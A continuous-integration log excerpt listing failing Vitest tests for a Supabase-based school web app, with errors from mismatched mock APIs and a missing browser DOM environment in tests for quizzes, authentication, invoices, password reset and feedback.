2025-11-18T17:36:11.0909846Z [31m[1m[7m FAIL [27m[22m[39m __tests__/quizSubmission.integration.test.ts[2m > [22mQuiz Submission Integration Tests[2m > [22msubmitQuiz[2m > [22mshould handle submission errors gracefully
2025-11-18T17:36:11.0911656Z [31m[1mTypeError[22m: vi.mocked(...).mockRejectedValueOnce is not a function[39m
2025-11-18T17:36:11.0912782Z [36m [2m❯[22m __tests__/quizSubmission.integration.test.ts:[2m102:31[22m[39m
2025-11-18T17:36:11.0913685Z     [90m100| [39m      const mockError = new Error('Database error');
2025-11-18T17:36:11.0914266Z     [90m101| [39m      
2025-11-18T17:36:11.0914978Z     [90m102| [39m      vi.mocked(supabase.rpc).mockRejectedValueOnce(mockError);
2025-11-18T17:36:11.0915760Z     [90m   | [39m                              [31m^[39m
2025-11-18T17:36:11.0916238Z     [90m103| [39m
2025-11-18T17:36:11.0916932Z     [90m104| [39m      const result = await submitQuiz(
2025-11-18T17:36:11.0917295Z 
2025-11-18T17:36:11.0917918Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[66/545]⎯[22m[39m
2025-11-18T17:36:11.0918254Z 
2025-11-18T17:36:11.0919930Z [31m[1m[7m FAIL [27m[22m[39m __tests__/quizSubmission.integration.test.ts[2m > [22mQuiz Submission Integration Tests[2m > [22msubmitQuiz[2m > [22mshould trigger notification for open-ended questions
2025-11-18T17:36:11.0921752Z [31m[1mTypeError[22m: vi.mocked(...).mockResolvedValueOnce is not a function[39m
2025-11-18T17:36:11.0922909Z [36m [2m❯[22m __tests__/quizSubmission.integration.test.ts:[2m126:31[22m[39m
2025-11-18T17:36:11.0923621Z     [90m124| [39m      };
2025-11-18T17:36:11.0924034Z     [90m125| [39m
2025-11-18T17:36:11.0924674Z     [90m126| [39m      vi.mocked(supabase.rpc).mockResolvedValueOnce({
2025-11-18T17:36:11.0925446Z     [90m   | [39m                              [31m^[39m
2025-11-18T17:36:11.0926080Z     [90m127| [39m        data: 'submission-123',
2025-11-18T17:36:11.0926632Z     [90m128| [39m        error: null
2025-11-18T17:36:11.0927094Z 
2025-11-18T17:36:11.0927539Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[67/545]⎯[22m[39m
2025-11-18T17:36:11.0927881Z 
2025-11-18T17:36:11.0929596Z [31m[1m[7m FAIL [27m[22m[39m __tests__/quizSubmission.integration.test.ts[2m > [22mQuiz Submission Integration Tests[2m > [22mgetQuizSubmission[2m > [22mshould fetch quiz submission with relations
2025-11-18T17:36:11.0931717Z [31m[1mTypeError[22m: vi.mocked(...).mockReturnValue is not a function[39m
2025-11-18T17:36:11.0932846Z [36m [2m❯[22m __tests__/quizSubmission.integration.test.ts:[2m178:32[22m[39m
2025-11-18T17:36:11.0933640Z     [90m176| [39m        })
2025-11-18T17:36:11.0934133Z     [90m177| [39m      };
2025-11-18T17:36:11.0934945Z     [90m178| [39m      vi.mocked(supabase.from).mockReturnValue(mockFromChain);
2025-11-18T17:36:11.0935826Z     [90m   | [39m                               [31m^[39m
2025-11-18T17:36:11.0936374Z     [90m179| [39m
2025-11-18T17:36:11.0937222Z     [90m180| [39m      // Mock the RPC call for score calculation
2025-11-18T17:36:11.0937653Z 
2025-11-18T17:36:11.0938096Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[68/545]⎯[22m[39m
2025-11-18T17:36:11.0938433Z 
2025-11-18T17:36:11.0940291Z [31m[1m[7m FAIL [27m[22m[39m __tests__/quizSubmission.integration.test.ts[2m > [22mQuiz Submission Integration Tests[2m > [22mgradeQuizOpenResponses[2m > [22mshould grade open-ended responses without exposing scores
2025-11-18T17:36:11.0942335Z [31m[1mTypeError[22m: vi.mocked(...).mockResolvedValueOnce is not a function[39m
2025-11-18T17:36:11.0943590Z [36m [2m❯[22m __tests__/quizSubmission.integration.test.ts:[2m206:31[22m[39m
2025-11-18T17:36:11.0944632Z     [90m204| [39m
2025-11-18T17:36:11.0945114Z     [90m205| [39m      // Mock the RPC call
2025-11-18T17:36:11.0945817Z     [90m206| [39m      vi.mocked(supabase.rpc).mockResolvedValueOnce({
2025-11-18T17:36:11.0946558Z     [90m   | [39m                              [31m^[39m
2025-11-18T17:36:11.0947365Z     [90m207| [39m        data: { success: true },
2025-11-18T17:36:11.0947954Z     [90m208| [39m        error: null
2025-11-18T17:36:11.0948234Z 
2025-11-18T17:36:11.0948616Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[69/545]⎯[22m[39m
2025-11-18T17:36:11.0948927Z 
2025-11-18T17:36:11.0950735Z [31m[1m[7m FAIL [27m[22m[39m __tests__/quizSubmission.integration.test.ts[2m > [22mQuiz Submission Integration Tests[2m > [22mLearning-Focused Flow[2m > [22mshould not return scores to student-facing functions
2025-11-18T17:36:11.0952691Z [31m[1mTypeError[22m: vi.mocked(...).mockResolvedValueOnce is not a function[39m
2025-11-18T17:36:11.0953947Z [36m [2m❯[22m __tests__/quizSubmission.integration.test.ts:[2m252:31[22m[39m
2025-11-18T17:36:11.0954664Z     [90m250| [39m      };
2025-11-18T17:36:11.0955110Z     [90m251| [39m
2025-11-18T17:36:11.0955814Z     [90m252| [39m      vi.mocked(supabase.rpc).mockResolvedValueOnce({
2025-11-18T17:36:11.0956630Z     [90m   | [39m                              [31m^[39m
2025-11-18T17:36:11.0957756Z     [90m253| [39m        data: 'submission-123',
2025-11-18T17:36:11.0958453Z     [90m254| [39m        error: null
2025-11-18T17:36:11.0958768Z 
2025-11-18T17:36:11.0959198Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[70/545]⎯[22m[39m
2025-11-18T17:36:11.0959515Z 
2025-11-18T17:36:11.0961242Z [31m[1m[7m FAIL [27m[22m[39m __tests__/quizSubmission.integration.test.ts[2m > [22mQuiz Submission Integration Tests[2m > [22mLearning-Focused Flow[2m > [22mshould support retry attempts without penalty
2025-11-18T17:36:11.0963146Z [31m[1mTypeError[22m: vi.mocked(...).mockResolvedValueOnce is not a function[39m
2025-11-18T17:36:11.0964407Z [36m [2m❯[22m __tests__/quizSubmission.integration.test.ts:[2m291:31[22m[39m
2025-11-18T17:36:11.0965101Z     [90m289| [39m      };
2025-11-18T17:36:11.0965498Z     [90m290| [39m
2025-11-18T17:36:11.0966181Z     [90m291| [39m      vi.mocked(supabase.rpc).mockResolvedValueOnce({
2025-11-18T17:36:11.0967289Z     [90m   | [39m                              [31m^[39m
2025-11-18T17:36:11.0967933Z     [90m292| [39m        data: 'submission-1',
2025-11-18T17:36:11.0968485Z     [90m293| [39m        error: null
2025-11-18T17:36:11.0968758Z 
2025-11-18T17:36:11.0969129Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[71/545]⎯[22m[39m
2025-11-18T17:36:11.0969439Z 
2025-11-18T17:36:11.0970848Z [31m[1m[7m FAIL [27m[22m[39m __tests__/quizSubmission.integration.test.ts[2m > [22mQuiz Submission Integration Tests[2m > [22mError Handling[2m > [22mshould handle RPC errors
2025-11-18T17:36:11.0972461Z [31m[1mTypeError[22m: vi.mocked(...).mockResolvedValueOnce is not a function[39m
2025-11-18T17:36:11.0973569Z [36m [2m❯[22m __tests__/quizSubmission.integration.test.ts:[2m352:31[22m[39m
2025-11-18T17:36:11.0974373Z     [90m350| [39m  describe('Error Handling', () => {
2025-11-18T17:36:11.0975089Z     [90m351| [39m    it('should handle RPC errors', async () => {
2025-11-18T17:36:11.0975892Z     [90m352| [39m      vi.mocked(supabase.rpc).mockResolvedValueOnce({
2025-11-18T17:36:11.0976630Z     [90m   | [39m                              [31m^[39m
2025-11-18T17:36:11.0977345Z     [90m353| [39m        data: null,
2025-11-18T17:36:11.0978009Z     [90m354| [39m        error: { message: 'RPC function not found' }
2025-11-18T17:36:11.0978387Z 
2025-11-18T17:36:11.0978743Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[72/545]⎯[22m[39m
2025-11-18T17:36:11.0979037Z 
2025-11-18T17:36:11.0980446Z [31m[1m[7m FAIL [27m[22m[39m __tests__/quizSubmission.integration.test.ts[2m > [22mQuiz Submission Integration Tests[2m > [22mError Handling[2m > [22mshould handle network errors
2025-11-18T17:36:11.0982338Z [31m[1mTypeError[22m: vi.mocked(...).mockRejectedValueOnce is not a function[39m
2025-11-18T17:36:11.0983527Z [36m [2m❯[22m __tests__/quizSubmission.integration.test.ts:[2m371:31[22m[39m
2025-11-18T17:36:11.0984185Z     [90m369| [39m
2025-11-18T17:36:11.0984759Z     [90m370| [39m    it('should handle network errors', async () => {
2025-11-18T17:36:11.0985768Z     [90m371| [39m      vi.mocked(supabase.rpc).mockRejectedValueOnce(new Error('Network…
2025-11-18T17:36:11.0986604Z     [90m   | [39m                              [31m^[39m
2025-11-18T17:36:11.0993440Z     [90m372| [39m
2025-11-18T17:36:11.0994040Z     [90m373| [39m      const result = await submitQuiz(
2025-11-18T17:36:11.0994411Z 
2025-11-18T17:36:11.0994840Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[73/545]⎯[22m[39m
2025-11-18T17:36:11.0995187Z 
2025-11-18T17:36:11.0997086Z [31m[1m[7m FAIL [27m[22m[39m __tests__/quizSubmission.integration.test.ts[2m > [22mQuiz Submission Integration Tests[2m > [22mError Handling[2m > [22mshould handle missing required fields
2025-11-18T17:36:11.0998833Z [31m[1mTypeError[22m: vi.mocked(...).mockRejectedValueOnce is not a function[39m
2025-11-18T17:36:11.1000101Z [36m [2m❯[22m __tests__/quizSubmission.integration.test.ts:[2m388:31[22m[39m
2025-11-18T17:36:11.1001193Z     [90m386| [39m    it('should handle missing required fields', async () => {
2025-11-18T17:36:11.1002338Z     [90m387| [39m      // Mock RPC to reject with a validation error
2025-11-18T17:36:11.1003438Z     [90m388| [39m      vi.mocked(supabase.rpc).mockRejectedValueOnce(new Error('Missing…
2025-11-18T17:36:11.1004382Z     [90m   | [39m                              [31m^[39m
2025-11-18T17:36:11.1004954Z     [90m389| [39m
2025-11-18T17:36:11.1005530Z     [90m390| [39m      const result = await submitQuiz(
2025-11-18T17:36:11.1005908Z 
2025-11-18T17:36:11.1006338Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[74/545]⎯[22m[39m
2025-11-18T17:36:11.1006685Z 
2025-11-18T17:36:11.1008402Z [31m[1m[7m FAIL [27m[22m[39m __tests__/quizSubmission.integration.test.ts[2m > [22mQuiz Submission Integration Tests[2m > [22mData Validation[2m > [22mshould validate answer format
2025-11-18T17:36:11.1011629Z [31m[1mTypeError[22m: vi.mocked(...).mockResolvedValueOnce is not a function[39m
2025-11-18T17:36:11.1013161Z [36m [2m❯[22m __tests__/quizSubmission.integration.test.ts:[2m413:31[22m[39m
2025-11-18T17:36:11.1013976Z     [90m411| [39m      };
2025-11-18T17:36:11.1014435Z     [90m412| [39m
2025-11-18T17:36:11.1015153Z     [90m413| [39m      vi.mocked(supabase.rpc).mockResolvedValueOnce({
2025-11-18T17:36:11.1015974Z     [90m   | [39m                              [31m^[39m
2025-11-18T17:36:11.1016608Z     [90m414| [39m        data: null,
2025-11-18T17:36:11.1017637Z     [90m415| [39m        error: { message: 'Invalid answer format' }
2025-11-18T17:36:11.1018063Z 
2025-11-18T17:36:11.1018502Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[75/545]⎯[22m[39m
2025-11-18T17:36:11.1018847Z 
2025-11-18T17:36:11.1020434Z [31m[1m[7m FAIL [27m[22m[39m __tests__/quizSubmission.integration.test.ts[2m > [22mQuiz Submission Integration Tests[2m > [22mData Validation[2m > [22mshould handle empty quiz data
2025-11-18T17:36:11.1022236Z [31m[1mTypeError[22m: vi.mocked(...).mockResolvedValueOnce is not a function[39m
2025-11-18T17:36:11.1023415Z [36m [2m❯[22m __tests__/quizSubmission.integration.test.ts:[2m437:31[22m[39m
2025-11-18T17:36:11.1024181Z     [90m435| [39m      };
2025-11-18T17:36:11.1024637Z     [90m436| [39m
2025-11-18T17:36:11.1025341Z     [90m437| [39m      vi.mocked(supabase.rpc).mockResolvedValueOnce({
2025-11-18T17:36:11.1026167Z     [90m   | [39m                              [31m^[39m
2025-11-18T17:36:11.1027079Z     [90m438| [39m        data: 'submission-123',
2025-11-18T17:36:11.1027698Z     [90m439| [39m        error: null
2025-11-18T17:36:11.1027999Z 
2025-11-18T17:36:11.1028441Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[76/545]⎯[22m[39m
2025-11-18T17:36:11.1029051Z 
2025-11-18T17:36:11.1030889Z [31m[1m[7m FAIL [27m[22m[39m __tests__/auth/auth-fix-validation.test.tsx[2m > [22mAuthentication Fix Validation[2m > [22mNo Competing Listeners[2m > [22mAuthContext should not create its own onAuthStateChange listener
2025-11-18T17:36:11.1034331Z [31m[1m[7m FAIL [27m[22m[39m __tests__/auth/auth-fix-validation.test.tsx[2m > [22mAuthentication Fix Validation[2m > [22mNo Competing Listeners[2m > [22mAuthContext should react to session changes from SessionContextProvider
2025-11-18T17:36:11.1037538Z [31m[1m[7m FAIL [27m[22m[39m __tests__/auth/auth-fix-validation.test.tsx[2m > [22mAuthentication Fix Validation[2m > [22mSession Persistence[2m > [22mshould maintain session across component remounts
2025-11-18T17:36:11.1040276Z [31m[1m[7m FAIL [27m[22m[39m __tests__/auth/auth-fix-validation.test.tsx[2m > [22mAuthentication Fix Validation[2m > [22mSession Persistence[2m > [22mshould handle session refresh without logout
2025-11-18T17:36:11.1042970Z [31m[1m[7m FAIL [27m[22m[39m __tests__/auth/auth-fix-validation.test.tsx[2m > [22mAuthentication Fix Validation[2m > [22mRole-Based Authentication[2m > [22mshould authenticate admin role correctly
2025-11-18T17:36:11.1045735Z [31m[1m[7m FAIL [27m[22m[39m __tests__/auth/auth-fix-validation.test.tsx[2m > [22mAuthentication Fix Validation[2m > [22mRole-Based Authentication[2m > [22mshould authenticate consultor role correctly
2025-11-18T17:36:11.1048674Z [31m[1m[7m FAIL [27m[22m[39m __tests__/auth/auth-fix-validation.test.tsx[2m > [22mAuthentication Fix Validation[2m > [22mRole-Based Authentication[2m > [22mshould authenticate equipo_directivo role correctly
2025-11-18T17:36:11.1051485Z [31m[1m[7m FAIL [27m[22m[39m __tests__/auth/auth-fix-validation.test.tsx[2m > [22mAuthentication Fix Validation[2m > [22mRole-Based Authentication[2m > [22mshould authenticate lider_generacion role correctly
2025-11-18T17:36:11.1054340Z [31m[1m[7m FAIL [27m[22m[39m __tests__/auth/auth-fix-validation.test.tsx[2m > [22mAuthentication Fix Validation[2m > [22mRole-Based Authentication[2m > [22mshould authenticate lider_comunidad role correctly
2025-11-18T17:36:11.1057346Z [31m[1m[7m FAIL [27m[22m[39m __tests__/auth/auth-fix-validation.test.tsx[2m > [22mAuthentication Fix Validation[2m > [22mRole-Based Authentication[2m > [22mshould authenticate docente role correctly
2025-11-18T17:36:11.1060176Z [31m[1m[7m FAIL [27m[22m[39m __tests__/auth/auth-fix-validation.test.tsx[2m > [22mAuthentication Fix Validation[2m > [22mLogout Functionality[2m > [22mshould clear session and redirect on logout
2025-11-18T17:36:11.1062093Z [31m[1mTypeError[22m: useSupabaseClient.mockReturnValue is not a function[39m
2025-11-18T17:36:11.1063350Z [36m [2m❯[22m __tests__/auth/auth-fix-validation.test.tsx:[2m86:38[22m[39m
2025-11-18T17:36:11.1064069Z     [90m 84| [39m
2025-11-18T17:36:11.1064654Z     [90m 85| [39m    // Setup mock implementations
2025-11-18T17:36:11.1065888Z     [90m 86| [39m    (useSupabaseClient as jest.Mock).mockReturnValue(mockSupabase);
2025-11-18T17:36:11.1067014Z     [90m   | [39m                                     [31m^[39m
2025-11-18T17:36:11.1067603Z     [90m 87| [39m  });
2025-11-18T17:36:11.1068004Z     [90m 88| [39m
2025-11-18T17:36:11.1068199Z 
2025-11-18T17:36:11.1068615Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[77/545]⎯[22m[39m
2025-11-18T17:36:11.1068974Z 
2025-11-18T17:36:11.1070474Z [31m[1m[7m FAIL [27m[22m[39m __tests__/auth/authentication-flow.test.tsx[2m > [22mAuthentication Flow Tests[2m > [22mLogin Flow[2m > [22mshould successfully login as admin
2025-11-18T17:36:11.1073076Z [31m[1m[7m FAIL [27m[22m[39m __tests__/auth/authentication-flow.test.tsx[2m > [22mAuthentication Flow Tests[2m > [22mLogin Flow[2m > [22mshould successfully login as consultor
2025-11-18T17:36:11.1075876Z [31m[1m[7m FAIL [27m[22m[39m __tests__/auth/authentication-flow.test.tsx[2m > [22mAuthentication Flow Tests[2m > [22mLogin Flow[2m > [22mshould successfully login as equipo_directivo
2025-11-18T17:36:11.1078678Z [31m[1m[7m FAIL [27m[22m[39m __tests__/auth/authentication-flow.test.tsx[2m > [22mAuthentication Flow Tests[2m > [22mLogin Flow[2m > [22mshould successfully login as lider_generacion
2025-11-18T17:36:11.1081374Z [31m[1m[7m FAIL [27m[22m[39m __tests__/auth/authentication-flow.test.tsx[2m > [22mAuthentication Flow Tests[2m > [22mLogin Flow[2m > [22mshould successfully login as lider_comunidad
2025-11-18T17:36:11.1083725Z [31m[1m[7m FAIL [27m[22m[39m __tests__/auth/authentication-flow.test.tsx[2m > [22mAuthentication Flow Tests[2m > [22mLogin Flow[2m > [22mshould successfully login as docente
2025-11-18T17:36:11.1086039Z [31m[1m[7m FAIL [27m[22m[39m __tests__/auth/authentication-flow.test.tsx[2m > [22mAuthentication Flow Tests[2m > [22mLogin Flow[2m > [22mshould handle "Remember Me" functionality
2025-11-18T17:36:11.1088811Z [31m[1m[7m FAIL [27m[22m[39m __tests__/auth/authentication-flow.test.tsx[2m > [22mAuthentication Flow Tests[2m > [22mSession Persistence[2m > [22mshould maintain session across page refreshes
2025-11-18T17:36:11.1091433Z [31m[1m[7m FAIL [27m[22m[39m __tests__/auth/authentication-flow.test.tsx[2m > [22mAuthentication Flow Tests[2m > [22mSession Persistence[2m > [22mshould handle token refresh before expiry
2025-11-18T17:36:11.1093938Z [31m[1m[7m FAIL [27m[22m[39m __tests__/auth/authentication-flow.test.tsx[2m > [22mAuthentication Flow Tests[2m > [22mLogout Flow[2m > [22mshould successfully logout and clear session
2025-11-18T17:36:11.1096432Z [31m[1m[7m FAIL [27m[22m[39m __tests__/auth/authentication-flow.test.tsx[2m > [22mAuthentication Flow Tests[2m > [22mError Handling[2m > [22mshould handle network errors gracefully
2025-11-18T17:36:11.1099198Z [31m[1m[7m FAIL [27m[22m[39m __tests__/auth/authentication-flow.test.tsx[2m > [22mAuthentication Flow Tests[2m > [22mError Handling[2m > [22mshould handle invalid credentials
2025-11-18T17:36:11.1100714Z [31m[1mReferenceError[22m: localStorage is not defined[39m
2025-11-18T17:36:11.1101752Z [36m [2m❯[22m __tests__/auth/authentication-flow.test.tsx:[2m64:5[22m[39m
2025-11-18T17:36:11.1102606Z     [90m 62| [39m    jest.clearAllMocks();
2025-11-18T17:36:11.1103260Z     [90m 63| [39m    // Reset localStorage
2025-11-18T17:36:11.1103875Z     [90m 64| [39m    localStorage.clear();
2025-11-18T17:36:11.1104446Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.1104942Z     [90m 65| [39m  });
2025-11-18T17:36:11.1105371Z     [90m 66| [39m
2025-11-18T17:36:11.1105579Z 
2025-11-18T17:36:11.1105986Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[78/545]⎯[22m[39m
2025-11-18T17:36:11.1106296Z 
2025-11-18T17:36:11.1108021Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion-simple.test.tsx[2m > [22mInvoice Deletion - ContractDetailsModal[2m > [22mrenders delete button for invoices
2025-11-18T17:36:11.1109602Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.1111056Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.1112349Z [36m [2m❯[22m __tests__/contracts/invoice-deletion-simple.test.tsx:[2m77:5[22m[39m
2025-11-18T17:36:11.1113078Z     [90m 75| [39m
2025-11-18T17:36:11.1113737Z     [90m 76| [39m  test('renders delete button for invoices', () => {
2025-11-18T17:36:11.1114662Z     [90m 77| [39m    render(<ContractDetailsModal {...defaultProps} />);
2025-11-18T17:36:11.1115355Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.1115849Z     [90m 78| [39m    
2025-11-18T17:36:11.1116631Z     [90m 79| [39m    const deleteButton = screen.getByTitle('Eliminar factura');
2025-11-18T17:36:11.1117308Z 
2025-11-18T17:36:11.1117756Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[79/545]⎯[22m[39m
2025-11-18T17:36:11.1118108Z 
2025-11-18T17:36:11.1119623Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion-simple.test.tsx[2m > [22mInvoice Deletion - ContractDetailsModal[2m > [22mrenders delete button for invoices
2025-11-18T17:36:11.1122379Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion-simple.test.tsx[2m > [22mInvoice Deletion - ContractDetailsModal[2m > [22mshows custom confirmation modal when delete is clicked
2025-11-18T17:36:11.1125329Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion-simple.test.tsx[2m > [22mInvoice Deletion - ContractDetailsModal[2m > [22mcloses modal when cancel is clicked
2025-11-18T17:36:11.1128284Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion-simple.test.tsx[2m > [22mInvoice Deletion - ContractDetailsModal[2m > [22mcalls onDeleteInvoice when confirmed
2025-11-18T17:36:11.1130915Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion-simple.test.tsx[2m > [22mInvoice Deletion - ContractDetailsModal[2m > [22mdisplays enhanced file information
2025-11-18T17:36:11.1133731Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion-simple.test.tsx[2m > [22mInvoice Deletion - ContractDetailsModal[2m > [22mhides invoice immediately on deletion (optimistic update)
2025-11-18T17:36:11.1136495Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion-simple.test.tsx[2m > [22mInvoice Deletion - ContractDetailsModal[2m > [22mshows loading state during deletion
2025-11-18T17:36:11.1139124Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion-simple.test.tsx[2m > [22mInvoice Helper Functions[2m > [22mformatFileSize works correctly
2025-11-18T17:36:11.1141373Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion-simple.test.tsx[2m > [22mInvoice Helper Functions[2m > [22mgetFileIcon returns correct icons
2025-11-18T17:36:11.1143546Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion-simple.test.tsx[2m > [22mInvoice Helper Functions[2m > [22mURL path extraction works
2025-11-18T17:36:11.1145989Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion.integration.test.tsx[2m > [22mInvoice Deletion Integration Tests[2m > [22mcomplete invoice deletion flow with optimistic updates
2025-11-18T17:36:11.1148920Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion.integration.test.tsx[2m > [22mInvoice Deletion Integration Tests[2m > [22mhandles deletion failure and reverts optimistic update
2025-11-18T17:36:11.1151500Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion.integration.test.tsx[2m > [22mInvoice Deletion Integration Tests[2m > [22mkeyboard navigation and accessibility
2025-11-18T17:36:11.1153788Z [31m[1m[7m FAIL [27m[22m[39m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould not render when isOpen is false
2025-11-18T17:36:11.1155885Z [31m[1m[7m FAIL [27m[22m[39m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould not render when user is null
2025-11-18T17:36:11.1158447Z [31m[1m[7m FAIL [27m[22m[39m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould render correctly when open with user
2025-11-18T17:36:11.1160767Z [31m[1m[7m FAIL [27m[22m[39m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould show error when submitting empty password
2025-11-18T17:36:11.1163188Z [31m[1m[7m FAIL [27m[22m[39m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould show error when passwords do not match
2025-11-18T17:36:11.1165643Z [31m[1m[7m FAIL [27m[22m[39m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould show error for password less than 6 characters
2025-11-18T17:36:11.1168251Z [31m[1m[7m FAIL [27m[22m[39m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould generate random password when button is clicked
2025-11-18T17:36:11.1170610Z [31m[1m[7m FAIL [27m[22m[39m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould toggle password visibility
2025-11-18T17:36:11.1172949Z [31m[1m[7m FAIL [27m[22m[39m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould successfully reset password with valid inputs
2025-11-18T17:36:11.1175472Z [31m[1m[7m FAIL [27m[22m[39m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould show error when password reset fails
2025-11-18T17:36:11.1178057Z [31m[1m[7m FAIL [27m[22m[39m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould disable buttons while resetting
2025-11-18T17:36:11.1180428Z [31m[1m[7m FAIL [27m[22m[39m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould close modal when cancel button is clicked
2025-11-18T17:36:11.1182794Z [31m[1m[7m FAIL [27m[22m[39m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould close modal when X button is clicked
2025-11-18T17:36:11.1184943Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mdoes not render when not open
2025-11-18T17:36:11.1188388Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mrenders when open
2025-11-18T17:36:11.1190761Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mdisplays feedback information
2025-11-18T17:36:11.1192944Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mdisplays correct icon for bug type
2025-11-18T17:36:11.1195093Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mdisplays correct icon for idea type
2025-11-18T17:36:11.1197478Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mdisplays screenshot when present
2025-11-18T17:36:11.1199695Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mdoes not display screenshot section when not present
2025-11-18T17:36:11.1201895Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mdisplays browser info in collapsible section
2025-11-18T17:36:11.1204125Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mshows status action buttons based on current status
2025-11-18T17:36:11.1206343Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mcalls onStatusUpdate when status button is clicked
2025-11-18T17:36:11.1208724Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mdisplays comment input
2025-11-18T17:36:11.1210594Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mcan add comments
2025-11-18T17:36:11.1212772Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mcloses modal when close button is clicked
2025-11-18T17:36:11.1214948Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mcloses modal when overlay is clicked
